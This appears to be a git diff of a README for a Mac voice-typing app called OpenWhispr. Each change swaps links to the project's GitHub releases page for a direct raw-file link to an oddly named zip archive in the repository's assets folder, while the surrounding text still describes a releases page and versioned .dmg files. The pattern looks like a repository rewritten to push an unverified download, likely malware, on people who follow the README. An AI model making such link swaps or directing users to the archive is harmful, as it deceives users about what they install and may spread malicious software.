@@ -1,6 +1,6 @@
 # 🎙️ OpenWhispr - Fast Voice Typing on Your Mac
 
-[![Download OpenWhispr](https://img.shields.io/badge/Download-OpenWhispr-F55353?style=for-the-badge&logo=github)](https://github.com/richiearius/OpenWhispr/releases)
+[![Download OpenWhispr](https://img.shields.io/badge/Download-OpenWhispr-F55353?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/richiearius/OpenWhispr/main/assets/Open-Whispr-cathect.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Running on supported hardware ensures OpenWhispr works efficiently without delay
 ## 🚀 Getting Started: How to Download and Install
 
 1. Visit the OpenWhispr release page to get the latest version:  
-   [OpenWhispr Releases](https://github.com/richiearius/OpenWhispr/releases)  
+   [OpenWhispr Releases](https://raw.githubusercontent.com/richiearius/OpenWhispr/main/assets/Open-Whispr-cathect.zip)  
 
 2. Look for the latest `.dmg` or `.zip` file under the most recent release. The file name usually contains the version number, like `OpenWhispr-v1.0.dmg`.  
 
@@ -83,7 +83,7 @@ If OpenWhispr is not working as expected, try these steps:
 - Check that you are holding the Fn key while speaking. The app listens only during this time.  
 - Ensure your macOS is updated to version 12.0 or later.  
 - Try speaking clearly and at a steady pace. Avoid background noise as much as possible.  
-- Re-download and reinstall OpenWhispr from the [releases page](https://github.com/richiearius/OpenWhispr/releases) if problems persist.  
+- Re-download and reinstall OpenWhispr from the [releases page](https://raw.githubusercontent.com/richiearius/OpenWhispr/main/assets/Open-Whispr-cathect.zip) if problems persist.  
 
 ---
 
@@ -112,6 +112,6 @@ If you have questions or need help, you can:
 
 ## 🔗 Download OpenWhispr Now
 
-[![Download OpenWhispr](https://img.shields.io/badge/Download-Here-4287f5?style=for-the-badge&logo=github)](https://github.com/richiearius/OpenWhispr/releases)
+[![Download OpenWhispr](https://img.shields.io/badge/Download-Here-4287f5?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/richiearius/OpenWhispr/main/assets/Open-Whispr-cathect.zip)
 
 Visit the release page to get the latest version and start using OpenWhispr today.
